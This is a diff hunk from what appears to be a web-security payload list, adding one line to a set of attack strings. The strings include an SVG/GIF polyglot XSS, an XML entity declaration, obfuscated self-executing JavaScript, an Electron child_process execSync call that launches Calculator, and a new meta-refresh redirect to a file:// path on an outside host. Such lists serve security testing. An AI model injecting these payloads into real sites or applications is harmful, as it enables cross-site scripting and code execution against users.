@@ -1704,3 +1704,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <!DOCTYPE a [<!ENTITY b SYSTEM '1' NDATA c><!ENTITY d SYSTEM '2' NDATA e><!NOTATION e SYSTEM '3'>]><f/>
 ([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
 <script>top.require('child_process').execSync('open -a Calculator')</script>
+<meta http-equiv="refresh" content="1; url=file:////net/xss.cx/xss.html">
